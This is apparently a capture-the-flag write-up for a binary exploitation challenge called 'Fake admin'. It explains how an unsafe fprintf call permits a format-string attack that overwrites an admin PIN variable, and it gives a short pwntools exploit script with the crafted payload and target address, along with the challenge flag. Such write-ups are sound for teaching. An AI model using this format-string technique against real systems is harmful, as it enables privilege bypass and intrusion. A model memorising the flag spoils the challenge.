# Fake admin

## PWN - Points: 1000

> Try to bypass our authorization system...
>
> nc task.pase.ca 24081
>
> [fake_admin](fake_admin)
>

The binary lets you write messages, but read messages only when you are an admin. To become an admin, you have to set the variable `admin_pin = 0x133713371338`, without having a normal way to do that. But when writing a message, `fprintf` is used to log a message to a file. This can be exploited by inputting a specially crafted format string that modifies the value. Then you can read all the messages that were appended to log file located at `/tmp/logfile.log` and the flag.

Exploit script:

```python
from pwn import *


p = process('fake_admin')
p.sendline('w')
p.sendline('%4916x    %19$hn' + p64(0x6020B8))
p.sendline('v')
print p.recv()
```

flag: `paseca{f0rm4t_str1ng_ag4in}`